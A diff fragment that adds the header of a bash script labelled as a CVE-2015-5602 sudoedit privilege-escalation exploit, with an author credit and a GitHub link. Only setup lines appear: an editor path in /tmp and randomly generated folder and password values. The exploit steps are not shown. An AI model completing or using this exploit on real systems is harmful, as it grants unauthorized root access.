@@ -1,3 +1,9 @@
+#!/usr/bin/env bash
+# CVE-2015-5602 exploit by t0kx
+# https://github.com/t0kx/privesc-CVE-2015-5602
+
+export EDITOR="/tmp/edit"
+export FOLDER="${RANDOM}"
 export PASSWD=$(printf ${RANDOM} \
 		| md5sum \
 		| awk '{print $1}')
